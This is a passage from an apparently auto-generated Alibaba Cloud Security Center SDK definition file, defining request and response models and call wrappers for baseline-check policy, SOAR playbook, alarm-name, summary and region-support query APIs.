 * @summary Queries a list of policy tasks on the Playbook page.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DescribeSoarStrategyTasksRequest
 * @return DescribeSoarStrategyTasksResponse
 */
async function describeSoarStrategyTasks(request: DescribeSoarStrategyTasksRequest): DescribeSoarStrategyTasksResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSoarStrategyTasksWithOptions(request, runtime);
}

model DescribeSoarSubscribedStrategyRequest {
  pageNumber?: int32(name='PageNumber', description='The page number. Pages start from page 1.

This parameter is required.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.

This parameter is required.', example='20'),
}

model DescribeSoarSubscribedStrategyResponseBody = {
  pageNumber?: int32(name='PageNumber', description='The page number. Pages start from page 1.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
  requestId?: string(name='RequestId', description='The request ID.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  soarStrategies?: [ 
    {
      creator?: string(name='Creator', description='The Alibaba Cloud account ID of the creator.', example='1276085*****4392'),
      description?: string(name='Description', description='The description of the policy.', example='strategy_description_01'),
      executeNum?: string(name='ExecuteNum', description='The total number of times that the policy is executed.', example='10'),
      gmtCreate?: long(name='GmtCreate', description='The timestamp when the policy was created. Unit: milliseconds.', example='1716344106000'),
      gmtModified?: long(name='GmtModified', description='The timestamp when the policy was modified. Unit: milliseconds.', example='1652672104000'),
      id?: long(name='Id', description='The ID of the policy.', example='300063'),
      name?: string(name='Name', description='The name of the policy.', example='strategy_name01'),
      runMode?: string(name='RunMode', description='The execution mode. Valid values:

*   runmode_TRIGGER_BY_USER: manually executed', example='runmode_TRIGGER_BY_USER'),
      type?: string(name='Type', description='The type of the policy. Valid values:

*   type_vulfix: vulnerability operations', example='type_vulfix'),
    }
  ](name='SoarStrategies', description='The policies.'),
  totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='101'),
}

model DescribeSoarSubscribedStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSoarSubscribedStrategyResponseBody(name='body'),
}

/**
 * @summary Queries a list of policies created on the Playbook page of Security Center.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DescribeSoarSubscribedStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSoarSubscribedStrategyResponse
 */
async function describeSoarSubscribedStrategyWithOptions(request: DescribeSoarSubscribedStrategyRequest, runtime: Util.RuntimeOptions): DescribeSoarSubscribedStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.pageNumber)) {
    query['PageNumber'] = request.pageNumber;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSoarSubscribedStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries a list of policies created on the Playbook page of Security Center.
 *
 * @description Only the Enterprise and Ultimate editions of Security Center support this API operation.
 *
 * @param request DescribeSoarSubscribedStrategyRequest
 * @return DescribeSoarSubscribedStrategyResponse
 */
async function describeSoarSubscribedStrategy(request: DescribeSoarSubscribedStrategyRequest): DescribeSoarSubscribedStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSoarSubscribedStrategyWithOptions(request, runtime);
}

model DescribeStrategyRequest {
  customType?: string(name='CustomType', description='The type of the baseline check policy that you want to query. Valid values:

*   **common**: standard baseline check policy
*   **custom**: custom baseline check policy', example='custom'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.X.X'),
  strategyIds?: string(name='StrategyIds', description='The ID of the baseline check policy that you want to query. Separate multiple IDs with commas (,).', example='8164248'),
}

model DescribeStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='75C127E6-76CD-59A7-B6E4-1CBBDC98F2EB'),
  strategies?: [ 
    {
      configTargets?: [ 
        {
          flag?: string(name='Flag', description='Indicates whether the baseline check policy is applied to the asset group. Valid values:

*   **add**: The baseline check policy is applied to the asset group.
*   **del**: the baseline check policy is not applied to the asset group.', example='add'),
          target?: string(name='Target', description='The asset group ID or UUID of the asset to which the baseline check policy is applied.', example='10099713'),
          targetType?: string(name='TargetType', description='The condition by which the baseline check policy is applied to the asset. Valid values:

*   **groupId**: the ID of the asset group
*   **uuid**: the UUID of the asset', example='groupId'),
        }
      ](name='ConfigTargets', description='The details of the assets to which the baseline check policy is applied.'),
      customType?: string(name='CustomType', description='The type of the baseline check policy. Valid values:

*   **common**
*   **custom**', example='custom'),
      cycleDays?: int32(name='CycleDays', description='The cycle of the baseline check. Valid values:

*   **1**: every 2 days
*   **3**: every 4 days
*   **7**: every 8 days
*   30: every 31 days', example='1'),
      cycleStartTime?: int32(name='CycleStartTime', description='The time when the baseline check starts. Valid values:

*   **0**: The baseline check starts within the time range from 00:00 to 06:00.
*   **6**: The baseline check starts within the time range from 06:00 to 12:00.
*   **12**: The baseline check starts within the time range from 12:00 to 18:00.
*   **18**: The baseline check starts within the time range from 18:00 to 24:00.', example='0'),
      ecsCount?: int32(name='EcsCount', description='The number of the assets to which the baseline check policy is applied.', example='50'),
      endTime?: string(name='EndTime', description='The end time of the baseline check policy.', example='03:00:00'),
      execStatus?: int32(name='ExecStatus', description='The status of the baseline check policy. Valid values:

*   **1**: not executed
*   **2**: executing', example='1'),
      id?: int32(name='Id', description='The ID of the baseline check policy.', example='8164248'),
      name?: string(name='Name', description='The name of the baseline check policy.', example='text2'),
      passRate?: int32(name='PassRate', description='The proportion of risky baselines in the baseline check result.', example='0'),
      percent?: string(name='Percent', description='The progress of the baseline check by using the baseline. This parameter is returned only if the value of the ExecStatus parameter is 2.', example='50%'),
      processRate?: int32(name='ProcessRate', description='The number of the assets on which the baseline check is complete.', example='20'),
      riskCount?: int32(name='RiskCount', description='The number of baseline check items in the baseline check policy.', example='23'),
      startTime?: string(name='StartTime', description='The start time of the baseline check policy.', example='00:00:00'),
      type?: int32(name='Type', description='The source type of the baseline check policy. Valid values:

*   **1**: indicates a built-in policy provided and performed by Security Center by default.
*   **2**: indicates a user-defined policy. It can be a standard or custom baseline check policy.', example='2'),
      userModifyTime?: long(name='UserModifyTime', description='The time when the baseline check policy was last modified.', example='2025-01-07 10:46:43'),
    }
  ](name='Strategies', description='The details of the baseline check policies.'),
}

model DescribeStrategyResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeStrategyResponseBody(name='body'),
}

/**
 * @summary Queries the details about baseline check policies.
 *
 * @param request DescribeStrategyRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeStrategyResponse
 */
async function describeStrategyWithOptions(request: DescribeStrategyRequest, runtime: Util.RuntimeOptions): DescribeStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.customType)) {
    query['CustomType'] = request.customType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyIds)) {
    query['StrategyIds'] = request.strategyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details about baseline check policies.
 *
 * @param request DescribeStrategyRequest
 * @return DescribeStrategyResponse
 */
async function describeStrategy(request: DescribeStrategyRequest): DescribeStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyWithOptions(request, runtime);
}

model DescribeStrategyDetailRequest {
  id?: string(name='Id', description='The ID of the baseline check policy.

This parameter is required.', example='123456'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeStrategyDetailResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='C5B28F65-9245-5DC1-B3CF-5F2756A756A8'),
  strategy?: {
    customType?: string(name='CustomType', description='The type of the baseline check policy that you want to query. Valid values:

*   **common**: standard baseline check policy
*   **custom**: custom baseline check policy', example='common'),
    cycleDays?: int32(name='CycleDays', description='The check interval of the policy.', example='3'),
    cycleStartTime?: int32(name='CycleStartTime', description='The time period during which the check starts. Valid values:

*   **0**: 00:00 to 06:00
*   **6**: 06:00 to 12:00
*   **12**: 12:00 to 18:00
*   **18**: 18:00 to 24:00', example='0'),
    endTime?: string(name='EndTime', description='The end time of the check. Specify the time in the HH:mm:ss format.', example='03:00:00'),
    id?: int32(name='Id', description='The ID of the baseline check policy.', example='123'),
    name?: string(name='Name', description='The name of the baseline check policy.', example='TestStrategy'),
    riskSubTypeName?: string(name='RiskSubTypeName', description='The subtype of the baselines. 

> You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the subtypes of baselines.', example='hc_nginx_linux,tomcat7,hc_mysql_ali,hc_docker'),
    riskTypeWhiteListQueryResultList?: [ 
      {
        alias?: string(name='Alias', description='The alias of the check item.', example='Unauthorized Access'),
        on?: boolean(name='On', description='Indicates whether the check item is selected. Valid values:

*   **true**
*   **false**', example='false'),
        subTypes?: [ 
          {
            alias?: string(name='Alias', description='The alias of the check item.', example='Redis unauthorized access high exploit vulnerability risk'),
            checkDetails?: [ 
              {
                checkDesc?: string(name='CheckDesc', description='The description of the check item.', example='Set password expiration time, force regular modification of password, reduce password leakage and guess risk.Use non-password login (e.g. key pair) please ignore this item.'),
                checkId?: long(name='CheckId', description='The ID of the check item.', example='206'),
                checkItem?: string(name='CheckItem', description='The check item.', example='Ensure password expiration period is set.'),
                rules?: [ 
                  {
                    defaultValue?: int32(name='DefaultValue', description='The default value of the rule.', example='2'),
                    optional?: int32(name='Optional', description='Indicates whether the rule can be selected. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
                    paramList?: [ 
                      {
                        enumValue?: string(name='EnumValue', description='The options that can be selected for the rule parameter if the value of ParamType is set to 2.', example='0,1,2,3'),
                        maxValue?: int32(name='MaxValue', description='The maximum value of the rule parameter.', example='999'),
                        minValue?: int32(name='MinValue', description='The minimum value of the rule parameter.', example='1'),
                        paramDefaultValue?: string(name='ParamDefaultValue', description='The default value of the rule parameter.', example='7'),
                        paramDesc?: string(name='ParamDesc', description='The description of the rule parameter.', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
                        paramName?: string(name='ParamName', description='The name of the rule parameter.', example='range_val'),
                        paramType?: int32(name='ParamType', description='The type of the rule parameter. Valid values:

*   **1**: input
*   **2**: selection', example='1'),
                        value?: string(name='Value', description='The configured value of the rule parameter.', example='7'),
                      }
                    ](name='ParamList', description='The rule parameters.'),
                    ruleDesc?: string(name='RuleDesc', description='The description of the rule.', example='Please customize the password expiration time detection standard as'),
                    ruleId?: string(name='RuleId', description='The rule ID.', example='login_unlock_deny_pam_faillock.must.cus'),
                  }
                ](name='Rules', description='The details of rules.'),
              }
            ](name='CheckDetails', description='The details of custom check items.'),
            on?: boolean(name='On', description='Indicates whether the sub-check item is selected. Valid values:

*   **true**
*   **false**', example='false'),
            supportedOs?: string(name='SupportedOs', description='The operating system type of the server. Valid values:
*   **windows**
*   **linux**', example='windows'),
            typeName?: string(name='TypeName', description='The type of the sub-check item.', example='hc_exploit_redis'),
          }
        ](name='SubTypes', description='The information about sub-check items.'),
        typeName?: string(name='TypeName', description='The name of the check item.', example='hc_exploit'),
      }
    ](name='RiskTypeWhiteListQueryResultList', description='The information about the whitelist of risk items.'),
    startTime?: string(name='StartTime', description='The start time of the check. Specify the time in the HH:mm:ss format.', example='02:00:00'),
    targetType?: string(name='TargetType', description='The method that is used to apply the baseline check policy. Valid values:

*   **groupId**: asset groups
*   **uuid**: assets', example='groupId'),
    type?: int32(name='Type', description='The type of the baseline check policy. Valid values:

*   **1**: standard policies
*   **2**: custom policies', example='1'),
  }(name='Strategy', description='The information about the baseline check policy.'),
}

model DescribeStrategyDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeStrategyDetailResponseBody(name='body'),
}

/**
 * @summary Queries the information about a baseline check policy.
 *
 * @param request DescribeStrategyDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeStrategyDetailResponse
 */
async function describeStrategyDetailWithOptions(request: DescribeStrategyDetailRequest, runtime: Util.RuntimeOptions): DescribeStrategyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about a baseline check policy.
 *
 * @param request DescribeStrategyDetailRequest
 * @return DescribeStrategyDetailResponse
 */
async function describeStrategyDetail(request: DescribeStrategyDetailRequest): DescribeStrategyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyDetailWithOptions(request, runtime);
}

model DescribeStrategyExecDetailRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 10. If you leave this parameter empty, 10 entries are returned on each page.

>  We recommend that you do not leave this parameter empty.', example='10'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.XX.XX'),
  strategyId?: int32(name='StrategyId', description='The ID of the baseline check policy.

>  You can call the [DescribeStrategy](~~DescribeStrategy~~) operation to query the IDs of baseline check policies.

This parameter is required.', example='8437592'),
}

model DescribeStrategyExecDetailResponseBody = {
  endTime?: string(name='EndTime', description='The time when the baseline check ends.', example='2021-12-05 00:12:46'),
  failCount?: int32(name='FailCount', description='The number of check items that failed to pass the baseline check. This type of check item is considered risk items.', example='94'),
  failedEcsList?: [ 
    {
      IP?: string(name='IP', description='The IP address of the server on which the baseline check was performed.', example='115.28.XX.XX'),
      instanceName?: string(name='InstanceName', description='The name of the instance.', example='worker-k8s-for-cs-cf5741fb95c3a45d0864f0e4544dc****'),
      internetIp?: string(name='InternetIp', description='The public IP address.', example='115.28.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address.', example='172.31.XX.XX'),
      reason?: string(name='Reason', description='The failure cause for the check item.', example='Detect timeout'),
    }
  ](name='FailedEcsList', description='The servers on which risk items were detected.'),
  inProcessCount?: int32(name='InProcessCount', description='The number of tasks that are **running **based on the baseline check policy.', example='0'),
  percent?: string(name='Percent', description='The execution progress of the baseline check policy.', example='100%'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='01611D72-1E33-53F5-A9A5-C81B5561970F'),
  source?: string(name='Source', description='The type of the baseline check. Valid values:

*   **Schedule**: automatic check that periodically runs
*   **Manual**: intermediate check that is manually performed', example='Manual'),
  startTime?: string(name='StartTime', description='The time when the baseline check starts.', example='2021-12-05 00:12:16'),
  successCount?: int32(name='SuccessCount', description='The number of check items that **passed** the baseline check.', example='81'),
}

model DescribeStrategyExecDetailResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeStrategyExecDetailResponseBody(name='body'),
}

/**
 * @summary Queries the results of the last baseline check by using a specified baseline check policy.
 *
 * @param request DescribeStrategyExecDetailRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeStrategyExecDetailResponse
 */
async function describeStrategyExecDetailWithOptions(request: DescribeStrategyExecDetailRequest, runtime: Util.RuntimeOptions): DescribeStrategyExecDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyExecDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the results of the last baseline check by using a specified baseline check policy.
 *
 * @param request DescribeStrategyExecDetailRequest
 * @return DescribeStrategyExecDetailResponse
 */
async function describeStrategyExecDetail(request: DescribeStrategyExecDetailRequest): DescribeStrategyExecDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyExecDetailWithOptions(request, runtime);
}

model DescribeStrategyTargetRequest {
  config?: string(name='Config', description='The ID of the baseline check policy.

This parameter is required.', example='{"strategyId":8167126}'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.X.X'),
  type?: string(name='Type', description='The type of the policy. Set the value to hc_strategy, which indicates baseline check policies.

This parameter is required.', example='hc_strategy'),
}

model DescribeStrategyTargetResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='001BAB34-D70A-54B0-B1D7-91B76DCDD8E8'),
  strategyTargets?: [ 
    {
      bindUuidCount?: int32(name='BindUuidCount', description='The number of the assets that belong to the asset group.', example='85'),
      flag?: string(name='Flag', description='Indicates whether the baseline check policy is applied to the asset group. Valid values:

*   **add**: The baseline check policy is applied to the asset group.
*   **del**: the baseline check policy is not applied to the asset group.', example='add'),
      target?: string(name='Target', description='The ID of the asset group to which the assets belong or the UUID of the asset.', example='9165712'),
      targetType?: string(name='TargetType', description='The method that is used to add the assets to the baseline check policy. Valid values:

*   **groupId**: the ID of the asset group
*   **uuid**: the UUID of the asset', example='groupId'),
    }
  ](name='StrategyTargets', description='The information about the assets to which the baseline check policy is applied.'),
}

model DescribeStrategyTargetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeStrategyTargetResponseBody(name='body'),
}

/**
 * @summary Queries the information about the assets to which a baseline check policy is applied.
 *
 * @param request DescribeStrategyTargetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeStrategyTargetResponse
 */
async function describeStrategyTargetWithOptions(request: DescribeStrategyTargetRequest, runtime: Util.RuntimeOptions): DescribeStrategyTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the information about the assets to which a baseline check policy is applied.
 *
 * @param request DescribeStrategyTargetRequest
 * @return DescribeStrategyTargetResponse
 */
async function describeStrategyTarget(request: DescribeStrategyTargetRequest): DescribeStrategyTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyTargetWithOptions(request, runtime);
}

model DescribeStrictEventNameRequest {
  lang?: string(name='Lang', description='Sets the language type for requests and received messages, default is **zh**. Values:

- **zh**: Chinese
- **en**: English', example='zh'),
}

model DescribeStrictEventNameResponseBody = {
  data?: [ 
    {
      eventName?: string(name='EventName', description='Alarm name.', example='System log abnormal deletion'),
      eventType?: string(name='EventType', description='Alarm type.', example='Suspicious Process'),
      showEventName?: string(name='ShowEventName', description='Displayed alarm name.', example='Suspicious Process'),
      showEventType?: string(name='ShowEventType', description='Displayed alarm type.', example='System log abnormal deletion'),
      switchConfig?: boolean(name='SwitchConfig', description='Indicates whether the user has enabled the strict mode for this alarm type.
- true: Enabled
- false: Not enabled', example='true'),
    }
  ](name='Data', description='Returned data.'),
  requestId?: string(name='RequestId', description='The ID of this call request, a unique identifier generated by Alibaba Cloud for this request, which can be used to troubleshoot and locate issues.', example='D65AADFC-1D20-5A6A-8F6A-9FA53C0D****'),
}

model DescribeStrictEventNameResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeStrictEventNameResponseBody(name='body'),
}

/**
 * @summary Strict mode supports alarm queries
 *
 * @param request DescribeStrictEventNameRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeStrictEventNameResponse
 */
async function describeStrictEventNameWithOptions(request: DescribeStrictEventNameRequest, runtime: Util.RuntimeOptions): DescribeStrictEventNameResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrictEventName',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Strict mode supports alarm queries
 *
 * @param request DescribeStrictEventNameRequest
 * @return DescribeStrictEventNameResponse
 */
async function describeStrictEventName(request: DescribeStrictEventNameRequest): DescribeStrictEventNameResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrictEventNameWithOptions(request, runtime);
}

model DescribeSummaryInfoRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeSummaryInfoResponseBody = {
  aegisClientOfflineCount?: int32(name='AegisClientOfflineCount', description='The number of unprotected assets.', example='12'),
  aegisClientOnlineCount?: int32(name='AegisClientOnlineCount', description='The number of protected assets.', example='127'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D40198E1-6EA8-482E-B3C7-D9573D75C0CA'),
  securityScore?: int32(name='SecurityScore', description='The security score of the assets. Valid values:

*   95 to 100: The assets are secure.
*   85 to 94: The assets are exposed to a few security risks. We recommend that you reinforce your security system in a timely manner.
*   70 to 84: The assets are exposed to multiple security risks. We recommend that you reinforce your security system in a timely manner.
*   69 or lower: The current security system is unable to protect the assets against intrusions. We recommend that you reinforce your security system at the earliest opportunity.', example='44'),
  success?: boolean(name='Success', description='Indicates whether the request is successful. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
}

model DescribeSummaryInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSummaryInfoResponseBody(name='body'),
}

/**
 * @summary Queries the security information about your assets. The information includes the security score and the numbers of protected and unprotected assets.
 *
 * @param request DescribeSummaryInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSummaryInfoResponse
 */
async function describeSummaryInfoWithOptions(request: DescribeSummaryInfoRequest, runtime: Util.RuntimeOptions): DescribeSummaryInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSummaryInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the security information about your assets. The information includes the security score and the numbers of protected and unprotected assets.
 *
 * @param request DescribeSummaryInfoRequest
 * @return DescribeSummaryInfoResponse
 */
async function describeSummaryInfo(request: DescribeSummaryInfoRequest): DescribeSummaryInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSummaryInfoWithOptions(request, runtime);
}

model DescribeSupervisonInfoResponseBody = {
  latestScanTime?: long(name='LatestScanTime', description='The time of the last system vulnerability scan. The value is a UNIX timestamp. Unit: milliseconds.', example='1721134553000'),
  requestId?: string(name='RequestId', description='The request ID.', example='E10BAF1C-A6C5-51E2-866C-76D5922E****'),
}

model DescribeSupervisonInfoResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSupervisonInfoResponseBody(name='body'),
}

/**
 * @summary Queries the time when a system vulnerability was last detected.
 *
 * @param request DescribeSupervisonInfoRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSupervisonInfoResponse
 */
async function describeSupervisonInfoWithOptions(runtime: Util.RuntimeOptions): DescribeSupervisonInfoResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeSupervisonInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the time when a system vulnerability was last detected.
 *
 * @return DescribeSupervisonInfoResponse
 */
async function describeSupervisonInfo(): DescribeSupervisonInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSupervisonInfoWithOptions(runtime);
}

model DescribeSupportRegionResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='2C0699D3-4107-5A46-A4C4-E129A5967788'),
  supportRegion?: [ string ](name='SupportRegion'),
}

model DescribeSupportRegionResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: DescribeSupportRegionResponseBody(name='body'),
}

/**
 * @summary Queries the regions in which the anti-ransomware feature is supported.
 *
 * @param request DescribeSupportRegionRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return DescribeSupportRegionResponse
 */
async function describeSupportRegionWithOptions(runtime: Util.RuntimeOptions): DescribeSupportRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeSupportRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the regions in which the anti-ransomware feature is supported.
 *
 * @return DescribeSupportRegionResponse
 */
async function describeSupportRegion(): DescribeSupportRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSupportRegionWithOptions(runtime);
}

model DescribeSuspEventDetailRequest {
  from?: string(name='From', description='The data source of the exception. Set the value to sas.

This parameter is required.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  resourceDirectoryAccountId?: long(name='ResourceDirectoryAccountId', description='The Alibaba Cloud account ID of the member in the resource directory.

>  You can call the [DescribeMonitorAccounts](~~DescribeMonitorAccounts~~) operation to query the ID.', example='16670360956*****'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='121.33.XX.XX'),
  suspiciousEventId?: int32(name='SuspiciousEventId', description='The ID of the exception.

This parameter is required.', example='32750999'),
}

model DescribeSuspEventDetailResponseBody = {
